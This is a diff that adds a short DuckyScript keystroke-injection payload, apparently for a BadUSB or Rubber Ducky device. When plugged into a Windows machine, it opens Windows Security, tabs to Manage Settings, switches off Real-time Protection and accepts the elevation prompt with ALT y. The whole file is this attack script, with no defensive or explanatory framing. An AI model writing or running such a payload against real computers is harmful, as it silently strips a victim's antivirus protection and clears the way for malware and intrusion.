@@ -1,0 +1,30 @@
+REM Pause for everything to recognize and be ready
+DELAY 750
+
+REM Open Windows Defender Settings
+CTRL ESC
+DELAY 750
+STRING windows security
+DELAY 250
+ENTER
+DELAY 4000
+ENTER
+
+REM Navigate to Manage Settings
+DELAY 1500
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+ENTER
+DELAY 100
+
+REM Open and turn off Realtime Protection
+SPACE
+DELAY 1000
+ALT y
+DELAY 1000
